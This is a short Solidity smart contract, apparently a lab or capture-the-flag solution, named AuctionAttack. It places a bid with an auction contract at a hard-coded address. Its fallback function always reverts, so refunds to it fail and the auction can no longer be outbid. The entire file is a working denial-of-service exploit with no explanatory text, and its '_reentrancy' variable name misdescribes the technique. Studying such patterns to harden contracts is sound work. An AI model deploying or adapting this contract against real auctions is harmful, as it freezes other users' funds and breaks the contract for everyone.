pragma solidity ^0.5.0;

contract AuctionAttack {
    
    address _reentrancy = 0xE958D39c97216b45b46dC45c846931F12E99D78F;
    
    function attack() public payable {
        
        bytes4 selector = bytes4(keccak256("bid()"));
        
        bytes memory data = abi.encodeWithSelector(selector);
        
        (bool success, ) = _reentrancy.call.value(msg.value)(data);
        require(success);
    }
    
    function() external payable {
        revert();
    }
}
